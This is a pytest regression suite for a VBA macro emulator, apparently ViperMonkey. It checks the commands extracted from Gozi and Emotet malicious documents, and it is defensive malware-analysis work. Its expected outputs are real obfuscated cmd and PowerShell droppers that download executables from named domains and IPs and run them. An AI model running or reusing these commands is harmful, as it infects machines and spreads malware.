import pytest
from vmonkey import *

"""
1) install pytest

2) create a directory somewhere full of malware samples. You can get most or all of these from the usual sources, 
like VirusTotal, app.any.run, etc.   We've named the samples by their sha256 hash so you can find them more easily.

3) pytest -v --path ${PATH_TO_YOUR_MALWARE_REPOSITORY} regression_tests.py
3a) add -m malware_family (gozi, emotet, ...) if you want to just test a specific flavor (uses pytest markers) or to test a
    specific kind of function.  You'll probably have to look around this file to do that. You should probably be better at
    adding func_FOO markers than I have been thus far, because i'm sure that's handy.  I'll fix it later (he says).
    -m fast is handy if you just want to quickly verify that stuff runs
3b) add -k "keywords" to run a specific kind of tests.  rtfm. it's nice.
3c) run it like regression_tests.py::test_SHAWHATEVER to run a single discrete test

4) Have fun!  (*)

(* Results may vary. Actual fun not guaranteed.)
"""

class maldoc(object):
	def __init__(self,filename):
		try:
			f=open(filename)
		except:
			pytest.skip("cannot open source file")
		self.data=f.read()
		f.close()

	def run(self):
		return process_file('','',self.data,strip_useless=True)

@pytest.mark.gozi
@pytest.mark.shapes
@pytest.mark.slow
def test_e4ecb82fb8a2bf785c2f976c1feea57bca2ff115f5a26c00a9282f9d7f43eb43(path):
	'''shapes('1').textframe.textrange.text'''
	t=maldoc(path+'e4ecb82fb8a2bf785c2f976c1feea57bca2ff115f5a26c00a9282f9d7f43eb43')
	r=t.run()
	assert r[0][1][1] == '''CMD Cmd/C   "Set  ctSI= .( ([StriNG]$vERbOSEPrEFeReNce)[1,3]+\'x\'-JOIN\'\') (NEW-ObJEct  io.CompreSSion.DefLAtestrEaM([IO.MemOrYStReam] [sYsTEm.COnVERT]::frOmbASE64STrINg(\'PZBda4MwFIb/Si4CqbhGuu3GBqGs28CxrowySmE3MT3W1JhIetAO8b9PZevted7znA/6tdWJhXbusjMoJB+AfA/Z2miwKGiaNgkrEOtlFEmPF4tQcuWq6ICf1q3+SCYLLZUHibqRE453h+1LXP4HlK4L8BXw2kRHiTJS7Q0V0g/DcncdG3nmo8fF+nyj8gLGyMo12p4mMy5OjO9qo3HGViwQdLN/Jwlh9w8xE7TKfULBNkuEqg7ZNwtHHjIOV2Aid8OOqpjRzdsT0ZaM5wUd+p+ODm/gz661xsnjqzYwZe7IKAxEahtXwjwdpFNFZIOnFL2SqIqu738B\') ,[IO.CompRessiON.cOmpreSSIoNmoDE]::dECOmPreSs ) ^|FOReach { NEW-ObJEct  sYstem.Io.StrEAmreAdeR( $_,[teXT.EnCoDiNG]::aSCii) } ^| foREaCh { $_.rEADtoENd() }) &&POwERshelL    $oB84i  =  [tyPe]( \\"{3}{0}{1}{2}\\"-F\'n\',\'MEN\',\'t\',\'eNvirO\' )    ; ${executiOnCONtExt}.\\"InVokec`Om`ma`ND\\".\\"in`VO`KES`CrIPT\\"(  (    (  GET-IteM  variabLE:oB84i   ).vaLuE::( \\"{1}{3}{2}{0}\\" -f \'E\',\'ge\',\'NVIroNmEnTVARiABl\',\'TE\'  ).Invoke( (\\"{0}{1}\\" -f\'cTs\',\'I\'),(  \\"{1}{2}{0}\\"-f \'S\',\'PR\',\'oCEs\') ) ))"'''

@pytest.mark.shapes
@pytest.mark.slow
def test_38c459e56997e759ca680f88aae4428d9c76e9fae323b4d2238adf203036007c(path):
	'''shapes('1').textframe.textrange.text'''
	t=maldoc(path+'38c459e56997e759ca680f88aae4428d9c76e9fae323b4d2238adf203036007c')
	r=t.run()
	assert r[0][1][1] == '''cMd.EXE /c poWerShelL.exe -ec KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwBwAGkAdgBhAGMAdAB1AGIAbQBpAC4AYwBvAG0ALwB0AHkAYwBsAGEAbQAvAGYAcgBlAHMAcwByAC4AcABoAHAAPwBsAD0AYwByAGUAYgAyAC4AdABrAG4AIgAsACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAIAArACAAJwBcADQANQAyAGUANAA5ADYAZAAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQAnAFwANAA1ADIAZQA0ADkANgBkAC4AZQB4AGUAJwA7ACAARQB4AGkAdAA='''

@pytest.mark.emotet
@pytest.mark.var_end_underscore
@pytest.mark.func_Create
@pytest.mark.keycodeconstants_at
def test_9f51918746416b2d8b1d6062030afc723ea45f65a97b29737aeb7fa0004ebb2a(path):
	''' KeyCodeConstants@.vbKeyP  and a variable with a trailing underscore, that could be mistaken for a line continuation
	uses Create to execute.
	'''
	t=maldoc(path+'9f51918746416b2d8b1d6062030afc723ea45f65a97b29737aeb7fa0004ebb2a')
	r=t.run()
	assert r[0][3][1][0] == """POwershell -e JABjADAANQA2ADgANgAzADMAPQAoACcAYQA3AF8AMQAnACsAJwBfADQAJwApADsAJABxADIAXwA3ADcAXwA2ADcAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAVQAyAF8ANwA4ADYAXwA9ACgAJwBoACcAKwAnAHQAdABwADoALwAvAHcAdwB3AC4AcwB3AGUAZQAnACsAJwB0AGgAJwArACcAdQBzAGsAeQAuAGMAJwArACcAbwBtACcAKwAnAC8AJwArACcAQQBPAHEAJwArACcAbwA4AHYAcABBACcAKwAnAGgAaAA3AHEANABfAFkAcwAnACsAJwBxAFEAbgA1AEAAaAB0ACcAKwAnAHQAcAAnACsAJwA6AC8ALwBtAGEAJwArACcAaABhACcAKwAnAGwAdQAnACsAJwB4AG0AaQBiACcAKwAnAHIAaQBjAGsAcwAnACsAJwAuAGMAbwBtAC8AeQBRACcAKwAnAHgAJwArACcAUABLAG8AMwAnACsAJwBjAEsANQAnACsAJwBFAEAAJwArACcAaAB0ACcAKwAnAHQAcAA6ACcAKwAnAC8ALwBuAGkAbQAnACsAJwBpAHQAdABhAC4AbAAnACsAJwBpAGYAJwArACcAZQAvADMAVAAnACsAJwAwAGsAUAAnACsAJwA4AHQAdwBsAFkAJwArACcANgAnACsAJwBkAEAAaAB0ACcAKwAnAHQAcAA6AC8ALwBkAGEAJwArACcAdgBpAGQAZQBtACcAKwAnAGEAcgAnACsAJwBvAGMAJwArACcAYwBvAC4AJwArACcAYwAnACsAJwBvAG0ALwBDACcAKwAnAFgAJwArACcAdwBHAHUAdgBHAEcAQwBwAE8AJwArACcAQABoACcAKwAnAHQAdABwADoALwAvAG0AJwArACcAYQBnACcAKwAnAG4AJwArACcAZQAnACsAJwB0AGMAYQByAGQAJwArACcALgBpACcAKwAnAHIALwBUACcAKwAnAE0AWQBxAG8AcQBjACcAKwAnAF8AcgAnACsAJwBtACcAKwAnAHcAYwBsACcAKQAuAFMAcABsAGkAdAAoACcAQAAnACkAOwAkAGoAXwA2ADgAOABfAD0AKAAnAEoAJwArACcAOAA1AF8AXwA3ADUAJwApADsAJABuADkAMAAwADgAXwBfACAAPQAgACgAJwA1ACcAKwAnADUAMgAnACkAOwAkAE4AMABfADgAOQBfAF8ANQA9ACgAJwBCACcAKwAnADgAXwA3ADMAOQAzADgAJwApADsAJABDADQAXwBfAF8AOQA2AD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJABuADkAMAAwADgAXwBfACsAKAAnAC4AZQB4ACcAKwAnAGUAJwApADsAZgBvAHIAZQBhAGMAaAAoACQAWAAwADUAOQA0ADcAIABpAG4AIAAkAFUAMgBfADcAOAA2AF8AKQB7AHQAcgB5AHsAJABxADIAXwA3ADcAXwA2ADcALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAWAAwADUAOQA0ADcALAAgACQAQwA0AF8AXwBfADkANgApADsAJABIADYANQBfADMAMAA9ACgAJwBNADEAMgAzACcAKwAnADMAXwBfACcAKwAnADAAJwApADsASQBmACAAKAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAQwA0AF8AXwBfADkANgApAC4AbABlAG4AZwB0AGgAIAAtAGcAZQAgADQAMAAwADAAMAApACAAewBJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAEMANABfAF8AXwA5ADYAOwAkAEcAOQBfADMAMQAyAD0AKAAnAGsAXwBfADQANQAnACsAJwBfADQAJwApADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAHUANgBfADYAXwBfAF8AMQA9ACgAJwBzADYAXwA4ACcAKwAnADgAMwAxACcAKwAnADYAJwApADsA """

@pytest.mark.emotet
@pytest.mark.word2007
@pytest.mark.thisdocument_run
@pytest.mark.func_strreverse
@pytest.mark.fast
def test_ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f(path):
	''' word 2007+ zip format, ThisDocument.Run'''
	t=maldoc(path+'ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f')
	r=t.run()
	assert r[0][1][1] == '''powershell $upn0rxUQ9 = \'$A79ly2i = new-obj0-9288027360ect -com0-9288027360obj0-9288027360ect wsc0-9288027360ript.she0-9288027360ll;$hC0u5Lk = new-object sys0-9288027360tem.net.web0-9288027360client;$eeVnNb = new-object random;$ME8h0Y = \\"0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://bignorthbarbell.com/yuf2G22rSI3c0s,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://mail.dentaladvance.pt/iyRttLHb,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://3d.tdselectronics.com/IWZfq9gD,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://greenflagtrails.co.za/HOHvd9NFU_BaZ62,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://kuoying.net/wp-admin/NcdixzAUZNsxHs0_8DoIcKe\\".spl0-9288027360it(\\",\\");$AmPFqKf = $eeVnNb.nex0-9288027360t(1, 65536);$V2sUJ = \\"c:\\win0-9288027360dows\\tem0-9288027360p\\24.ex0-9288027360e\\";for0-9288027360each($Y92Bsgj in $ME8h0Y){try{$hC0u5Lk.dow0-9288027360nlo0-9288027360adf0-9288027360ile($Y92Bsgj.ToS0-9288027360tring(), $V2sUJ);sta0-9288027360rt-pro0-9288027360cess $V2sUJ;break;}catch{}}\'.replace(\'0-9288027360\', $NRYM8nmxZ);$c4xw1H = \'\';iex($upn0rxUQ9);'''

@pytest.mark.emotet
@pytest.mark.keycodeconstants_bang
@pytest.mark.slow
def test_766bbe194f281546b2675c63ddf61c89fa005e6cf6734e7fad4e74392f87821a(path):
	''' KeyCodeConstants!.vbKeyP, trailing spaces on the output commandline '''
	t=maldoc(path+'766bbe194f281546b2675c63ddf61c89fa005e6cf6734e7fad4e74392f87821a')
	r=t.run()
	assert r[0][1][1] == '''POwershell -e JABoAG4AWABvAEQAbABXAD0AKAAnAFcAcwAnACsAJwBBADkAcwB3AHoAJwArACcAVQAnACkAOwAkAEoAYQBjAFcAUwBGAHEAYwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABqAEQAbgB3AGIAOQB2AD0AKAAnAGgAdAB0AHAAOgAvACcAKwAnAC8AdABoAHIAZQAnACsAJwBlAG0AJwArACcAZQBuACcAKwAnAGEAbgBkACcAKwAnAGEAJwArACcAbQBvAHYAaQBlAC4AYwBvAG0AJwArACcALwA4ACcAKwAnADAAYwAnACsAJwBwAFAAJwArACcAcQBxAHYATgBAAGgAdAB0AHAAOgAvAC8AdwB3AHcALgAnACsAJwBzACcAKwAnAGgAJwArACcAbwAnACsAJwBwAC4AawBhAGkAJwArACcAcwBoAGMAbAAnACsAJwBhACcAKwAnAHMAcwAnACsAJwBlAHMALgBjAG8AJwArACcAbQAnACsAJwAvACcAKwAnAFMAVwAnACsAJwBPAFEAJwArACcATQBUADAAJwArACcAeQAnACsAJwBLAEAAaAB0AHQAcAA6AC8ALwBjAGEAJwArACcAcgBiAG8AdABlAGMAaAAnACsAJwAtACcAKwAnAHQAcgAuAGMAJwArACcAbwBtAC8AUgAyAFEAYgBIACcAKwAnAGYAcAAwAGcANgBAAGgAdAB0ACcAKwAnAHAAJwArACcAOgAnACsAJwAvAC8AeQB1AG4AaABhAGwAaQAuAG4AZQB0AC8AdwBnAFkAMwA0AEQAJwArACcASwAnACsAJwBpAFQASwAnACsAJwBAAGgAdAAnACsAJwB0AHAAJwArACcAOgAvAC8AdgBjAHAAZQAnACsAJwBzAGEAJwArACcAYQBzACcAKwAnAC4AYwBvAG0ALwB1ADEAeQAnACsAJwBLADEAMQBnAFIAJwApAC4AUwBwAGwAaQB0ACgAJwBAACcAKQA7ACQAWgBoAG8ATwA4AGgAPQAoACcAVABoAEoAYwAnACsAJwBGACcAKwAnADUANgA3ACcAKQA7ACQAYgBDAGEANQB3AFMAbQAgAD0AIAAoACcANgAnACsAJwA3ADcAJwApADsAJABjAGMAdgBwAEcASAB1AD0AKAAnAFIAbwBHAGkAdABUACcAKwAnAEQAJwApADsAJABmAEQASQBqADkAaAA9ACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQAYgBDAGEANQB3AFMAbQArACgAJwAuAGUAJwArACcAeABlACcAKQA7AGYAbwByAGUAYQBjAGgAKAAkAFgAOAB1AHIAYwBZAGsAVAAgAGkAbgAgACQAagBEAG4AdwBiADkAdgApAHsAdAByAHkAewAkAEoAYQBjAFcAUwBGAHEAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABYADgAdQByAGMAWQBrAFQALAAgACQAZgBEAEkAagA5AGgAKQA7ACQAVQBaAEcAdwA3ADAAVAB0AD0AKAAnAEYAQwB2AEcAUgAnACsAJwAxAEEAJwApADsASQBmACAAKAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAZgBEAEkAagA5AGgAKQAuAGwAZQBuAGcAdABoACAALQBnAGUAIAA0ADAAMAAwADAAKQAgAHsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABmAEQASQBqADkAaAA7ACQAdABpAEgATgBIAHAAVgBzAD0AKAAnAGwAdgAnACsAJwAxADAAOABSAEcAVwAnACkAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAbwBXAFcASgBIAFUAZgA9ACgAJwBxAG8AcwBjAFUARAAnACsAJwBhACcAKQA7AA==  '''

@pytest.mark.emotet
@pytest.mark.xml
@pytest.mark.keycodeconstants_bang
def test_4e41e9af78f6883063e2adb3569a6016e9b3e05e01abf2267426e0c24f97345e(path):
	''' XML docx file, KeyCodeConstants!.vbKeyP '''
	t=maldoc(path+'4e41e9af78f6883063e2adb3569a6016e9b3e05e01abf2267426e0c24f97345e')
	r=t.run()
	assert r[0][1][1] == '''POwershell -e JABmAHoASgBSAGEAbgBqAFcAPQAoACcAaQBUADgAcQAnACsAJwBuACcAKwAnAFQAdwAnACkAOwAkAE4AdgAyAGsAVwBMAEkAZgA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABSAE8ARgBTAFQAdwA9ACgAJwBoAHQAdABwADoALwAnACsAJwAvAGIAJwArACcAaQBnAG4AbwAnACsAJwByAHQAJwArACcAaABiAGEAcgAnACsAJwBiACcAKwAnAGUAJwArACcAbAAnACsAJwBsAC4AYwBvACcAKwAnAG0ALwAnACsAJwB5AHUAZgAnACsAJwAyAEcAMgAyAHIAUwBJACcAKwAnADMAJwArACcAYwAnACsAJwAwAHMAQABoAHQAdABwADoAJwArACcALwAvAG0AYQBpACcAKwAnAGwAJwArACcALgAnACsAJwBkACcAKwAnAGUAbgB0ACcAKwAnAGEAJwArACcAbABhAGQAdgAnACsAJwBhAG4AJwArACcAYwAnACsAJwBlACcAKwAnAC4AJwArACcAcAB0AC8AJwArACcAaQB5ACcAKwAnAFIAdAB0ACcAKwAnAEwASABiAEAAaAAnACsAJwB0AHQAJwArACcAcAA6AC8ALwAzAGQALgB0AGQAcwBlAGwAZQBjAHQAJwArACcAcgBvAG4AaQBjAHMALgBjAG8AJwArACcAbQAvAEkAVwBaAGYAJwArACcAcQAnACsAJwA5AGcAJwArACcARABAAGgAJwArACcAdAB0ACcAKwAnAHAAOgAnACsAJwAvAC8AZwByAGUAZQBuACcAKwAnAGYAbABhAGcAdAByAGEAaQBsAHMAJwArACcALgBjAG8ALgAnACsAJwB6ACcAKwAnAGEALwBIAE8ASAAnACsAJwB2ACcAKwAnAGQAJwArACcAOQBOAEYAVQAnACsAJwBfAEIAYQBaADYAMgBAAGgAJwArACcAdAB0AHAAOgAvAC8AawB1AG8AeQBpAG4AZwAuAG4AZQB0AC8AdwAnACsAJwBwAC0AYQBkAG0AaQBuACcAKwAnAC8ATgAnACsAJwBjAGQAaQB4AHoAJwArACcAQQAnACsAJwBVAFoATgBzAHgASABzADAAXwA4ACcAKwAnAEQAbwAnACsAJwBJAGMASwAnACsAJwBlACcAKQAuAFMAcABsAGkAdAAoACcAQAAnACkAOwAkAEwAZgBNADAARQAxAD0AKAAnAEIAMAAnACsAJwBrAHoAYgBWAEIAJwApADsAJABMAHQAZgAzADIAbwAgAD0AIAAoACcANQA1ACcAKwAnADkAJwApADsAJABEAHIAMQBNAE4AUgBvAGIAPQAoACcAYgBGACcAKwAnAE0ARQAzAG8AJwApADsAJABIAGkAdgBrAEkATwBBAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJABMAHQAZgAzADIAbwArACgAJwAuACcAKwAnAGUAeABlACcAKQA7AGYAbwByAGUAYQBjAGgAKAAkAFkAbwBHADgAdwBLADcAIABpAG4AIAAkAFIATwBGAFMAVAB3ACkAewB0AHIAeQB7ACQATgB2ADIAawBXAEwASQBmAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFkAbwBHADgAdwBLADcALAAgACQASABpAHYAawBJAE8AQQApADsAJABWAHoARQBiAE4ARAA9ACgAJwBPAHcASQA4ADYASQAnACsAJwBoACcAKQA7AEkAZgAgACgAKABHAGUAdAAtAEkAdABlAG0AIAAkAEgAaQB2AGsASQBPAEEAKQAuAGwAZQBuAGcAdABoACAALQBnAGUAIAA0ADAAMAAwADAAKQAgAHsASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAJABIAGkAdgBrAEkATwBBADsAJABPAEsAQgBTADYAVgBuAHIAPQAoACcAdwAnACsAJwB3AGoANQB6ADgAJwApADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAE8AegBuAGkAdwBvAD0AKAAnAHQAUwAnACsAJwBMAE0AWgBpAHoAJwArACcAVQAnACkAOwA='''

@pytest.mark.emotet
@pytest.mark.xml
def test_ec09c09c0729c9044703d642389aadba745d437bd08f1b56932461977cd79a40(path):
	''' xml docx file '''
	t=maldoc(path+'ec09c09c0729c9044703d642389aadba745d437bd08f1b56932461977cd79a40')
	r=t.run()
	assert r[0][1][1] == '''POwershell -e JABJAHIASwBTAHEAaQBqAD0AKAAnAGEAUABJAHAAWgAnACsAJwBjAHAAJwApADsAJABrAFIAdwB1AFMAOAB0AEwAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBXADgAVQBQAEsAVAA9ACgAJwBoAHQAdABwADoAJwArACcALwAvADMAJwArACcAMQAnACsAJwAuADEAMwAnACsAJwAxACcAKwAnAC4AMgAnACsAJwA0AC4AMQA1ACcAKwAnADMAJwArACcALwBlAFkAWABhAEoAUgBNACcAKwAnAGQAQABoACcAKwAnAHQAdABwADoALwAvADQAMAAuADYAOQAuADIAJwArACcAMwAuADEAJwArACcAMwAnACsAJwAxAC8AOABvAHkAJwArACcAZgAnACsAJwBrAG8AeAAwAG0AbgAnACsAJwBAAGgAdAAnACsAJwB0ACcAKwAnAHAAOgAvACcAKwAnAC8AMQA2ADAAJwArACcALgAnACsAJwAyADAALgAnACsAJwAxADQANQAnACsAJwAuADEAMAAzAC8AcwBmACcAKwAnAGMAZABjAEMAJwArACcAQgBNAEAAJwArACcAaAB0AHQAcAA6AC8ALwAyADAANAAuADIANwAnACsAJwAuACcAKwAnADYAMQAuADIANAA0AC8AJwArACcARwBXAHIATQBOAGsAawAnACsAJwBAAGgAdAB0AHAAOgAvAC8AMwAuADkAJwArACcAMgAnACsAJwAuADEANwAnACsAJwA0AC4AMQAwADAALwAnACsAJwBGACcAKwAnAFYANQBuAGIAdgAnACsAJwBWAFAAJwApAC4AUwBwAGwAaQB0ACgAJwBAACcAKQA7ACQAaQBZAEMANgBxAFoAPQAoACcAdQAnACsAJwAwACcAKwAnADEARABQAEEAcAAnACkAOwAkAEEAdQBtAFoAbQBqADcAQgAgAD0AIAAoACcANwAzACcAKwAnADkAJwApADsAJAB1ADYAbABWAEMAegBwAEkAPQAoACcARQBNACcAKwAnADgAJwArACcAOABpAHMAVwBsACcAKQA7ACQATABSADEAagBUAEIAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAEEAdQBtAFoAbQBqADcAQgArACgAJwAuACcAKwAnAGUAeABlACcAKQA7AGYAbwByAGUAYQBjAGgAKAAkAFoAawBNAEIAcQBGADMAIABpAG4AIAAkAHcAVwA4AFUAUABLAFQAKQB7AHQAcgB5AHsAJABrAFIAdwB1AFMAOAB0AEwALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAWgBrAE0AQgBxAEYAMwAsACAAJABMAFIAMQBqAFQAQgApADsAJABCAHYASQBIAGwAagA9ACgAJwBOAFAAYwA2AHAAJwArACcAbwAnACkAOwBJAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABMAFIAMQBqAFQAQgApAC4AbABlAG4AZwB0AGgAIAAtAGcAZQAgADQAMAAwADAAMAApACAAewBJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAEwAUgAxAGoAVABCADsAJABqAFQAVwBNAFEAaAA9ACgAJwBYACcAKwAnAHEAQwA0AGkAJwArACcAaAAnACkAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAVwBmAHcASAB3AGQAPQAoACcASwBXADQAVgAnACsAJwBaAEsAagAnACkAOwA='''

@pytest.mark.emotet
@pytest.mark.naked_string_assembly
@pytest.mark.xml
@pytest.mark.interaction_shell
def test_232aa81b4293f5f18e8f663f42b37060876239414463bc612f19874f5c818fed(path):
	''' interaction.shell as execute command, naked string assembly inside '''
	t=maldoc(path+'232aa81b4293f5f18e8f663f42b37060876239414463bc612f19874f5c818fed')
	r=t.run()
	assert r[0][1][1] == '''c:\\csjijjt\\wbbidrd\\wwzmzpp\\..\\..\\..\\windows\\system32\\cmd.exe /c %ProgramData:~0,1%%ProgramData:~9,2% /V:O/C"set 3H=;\'pnjtrs\'=ziisvh$}}{hctac}};kaerb;\'jjkjwff\'=bzpoqlc$;tqdiwz$ metI-ekovnI{ )00004 eg- htgnel.)tqdiwz$ metI-teG(( fI;\'orjzit\'=fzkivqu$;)tqdiwz$ ,trtpaoz$(eliFdaolnwoD.wbzidk${yrt{)zvzjra$ ni trtpaoz$(hcaerof;\'exe.\'+dzbndsi$+\'\\\'+pmet:vne$=tqdiwz$;\'kvqzi\'=samdvci$;\'956\' = dzbndsi$;\'zjcjq\'=wjklwc$;)\'@\'(tilpS.\'H3x_NihbYIkVqtGqAh/ni.emohydit//:ptth@z65j51CJnOlzN/moc.syadiloheezm//:ptth@xO9E1qNi_SZNqXs1EUS0l/moc.semagruetamalanoitanretni//:ptth@xVOmBYxdJrnZK6/ni.gro.aidnitsaf//:ptth@E0IUJptPqzx/emosewa_tnof/sedulcni/omed/moc.rotacolizib.www//:ptth\'=zvzjra$;tneilCbeW.teN tcejbo-wen=wbzidk$;\'ktuvvtm\'=fzzlzp$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop&&for /L %L in (656,-1,0)do set 3LJS=!3LJS!!3H:~%L,1!&&if %L equ 0 echo !3LJS:~6!| cmd.exe"'''

@pytest.mark.fast
@pytest.mark.emotet
@pytest.mark.cdf2
@pytest.mark.interaction_shell
@pytest.mark.textbox
def test_c423ec19fc58c1bbda4317daf5f3afcaba2f7398296341a942ae934e1f2f0836(path):
	''' CDF V2 doc. interaction.shell, junk from a textbox '''
	t=maldoc(path+'c423ec19fc58c1bbda4317daf5f3afcaba2f7398296341a942ae934e1f2f0836')
	r=t.run()
	assert r[0][1][1] == '''cmd /c %PrOGrAMDATA:~0,1%%prOGraMdata:~9,2%   /V:  /C   "sET ZRX4=OUj=/a~\',b1%-h.)CSlN dtY8PiR6oM4Arxwnuy\\KfDX:J{mg}GEp$L+5Wk9IB2ce7F;3v0(Ts@&&FOR %n  In  (   52   ,  29   ,  35, 11    ,25    , 1,    61  ,   54 ,60  ,  16   ,44  , 6,56, 8  ,10,  11    ,   33, 11  ,  17  ,51   ,17, 17    ,   60  ,0 , 19  ,19 ,    32 ,    30  , 51  ,  44,  6 , 12    , 31,8  ,10,   11,    13  ,  11    ,  72   ,    51,30 , 25    ,  44 ,    6    , 12  , 68,   8  ,  10    , 11, 18  ,   18  ,20    ,  53    ,  26,28   ,   24   , 70  ,3    , 7    ,35 ,   31   ,65,  59 ,  7    ,67  ,  53   ,  36   , 65    ,    62, 70    , 3 ,36 , 64  ,35 ,   12   ,    29 , 9  ,2    ,64    , 63 ,   22    , 20  ,   19  ,    64    ,   22    ,  14   ,  57  ,    64   ,   9  ,16    ,  18  ,  26    , 64,  36  ,22,67 ,53 ,9    , 68 , 28 ,    24 ,   3,    7   , 13  ,   22,    22 ,    52  , 44    ,  4    ,    4,    2  ,    29    ,  13 , 36    ,  36   ,    38    ,63,   33    ,    5   , 52 ,  14   ,  63, 29 ,   47   ,  4,  13  ,29    , 10   ,    52   ,  13 , 70 ,  36 ,2  ,   21,74 ,    13 , 22  ,22    , 52  ,   44 ,4,  4  ,   58 ,  26  ,   21   , 73 , 12 ,64   ,  21,37 ,  63   ,  5   ,    22 , 26   ,  29 ,   36   ,12 ,   73    ,  37,  52 ,    52 , 29 ,   33    ,22   , 14    ,    63,   29  ,    47  ,   4    ,54    ,27    ,18 ,  10,    56,16,  23  ,   74   , 13  , 22   ,   22  ,  52  ,44   , 4, 4   ,   22  ,    29,  33, 22  ,37  ,    48    ,5,  21,    5,  22  , 5   ,63   , 29   ,  33  ,    52  , 14 ,    63  ,  29    ,47    ,   4   , 40   ,68   ,   23,   65   ,   26 , 21   , 52  ,  74   ,13  ,22,  22, 52 ,   44   ,  4   ,    4    ,   33 ,64,5,    18   ,    26 ,22 ,38 , 63    ,    29 , 47   ,  52  , 37   , 22 ,    64   ,33,   73 ,    14,   36   ,  18,    4   ,    16    , 43  ,62 ,26    , 9 ,    34,   27,   56   ,  33   ,31,   74    ,  13    ,   22  ,   22,    52    ,   44,    4, 4    ,   2   ,5   ,  73    ,  52  , 26   ,    36 ,   41    ,  29    ,   33 , 47   ,   5    ,   22    ,  26 ,  63,5 , 14  , 63   , 29,  47  ,    4,73  ,  21,   54 , 24    ,    73 ,  65   ,  13  ,  48,   7  ,14   ,   17,  52   , 18   ,   26,  22 , 71   , 7   ,   74    ,   7,    15 ,  67    ,   53    ,    27   , 65   ,70 ,10 ,  3   ,  7   ,    69    ,68  , 31,  65,7,67    ,  53    ,  18,    70   ,  31  ,   10,   20    ,    3  ,    20 ,  7  ,   68  ,    65  ,10 ,    7,   67   ,  53 ,40   ,   62, 70 ,   28  ,  3,    7  ,    45 , 59,28  ,  31 ,  7  ,    67 ,    53  , 35 ,    56,    62, 56 ,    3,53,64  ,36,   69,  44  ,    52    ,  37   ,  9    ,    18    ,26   ,    63 ,55    ,   7   , 39   ,    7  ,    55  ,   53,  18  ,  70    , 31  ,10   ,    55 ,    7  ,  14,    64,   34 , 64,7 ,  67 ,41, 29   ,    33    ,   64  ,5  ,  63,  13  ,  71   ,  53,   37   ,24   , 65   ,  65   ,   20 , 26   ,  36 ,    20  ,  53    ,    9   ,    68  ,28  ,   24   ,15 , 46,  22   ,  33    ,   38  ,    46    ,   53    , 36 ,  65, 62,    70 ,14  , 42, 29    ,    35    ,   36  ,18    ,    29,    5 , 21,    66   , 26,    18    ,    64  , 71 ,   53 ,   37    , 24    ,   65,  65    ,  8   ,  20,    53  ,  35    ,   56    ,   62 , 56 ,   15,    67 , 53  ,0  ,    10  , 65   , 10,  3  ,    7    , 21    , 28 , 70    ,   68,7    ,   67  , 60  ,  41  ,20 , 71 ,  71    ,    50 ,   64 ,22 ,   12 ,60  ,    22  ,    64,    47    , 20 ,    53   ,   35  ,56 ,62   ,    56,15    ,    14   ,  18    ,64 , 36    ,48    ,22  ,   13   ,  20    ,  12    ,48    ,   64   ,    20   ,   24    ,   70   ,  70    ,  70,    70    ,    15   , 20  ,   46 ,60,  36    ,  69,    29    ,  58    ,64,12  ,    60    , 22,64,47  ,  20 ,  53    ,    35 , 56 ,   62,   56,  67,   53    ,  42,24 ,  24, 28    ,   3   ,7  ,63   ,   62 ,62   ,   68  ,7    ,   67,   9,33    ,64    ,5,   58    , 67, 49  , 49  ,  63  ,    5   ,    22,63    ,   13 ,   46    ,  49   , 49 ,53    ,  21,   65  ,65, 59  ,3,   7    ,    1    ,24 ,    31 ,   59  , 7,67  ,80   )DO seT   HS=!HS!!ZRX4:~   %n,  1!&if %n GEq  80 ECho !HS:~    4! |  CMD"'''

@pytest.mark.fast
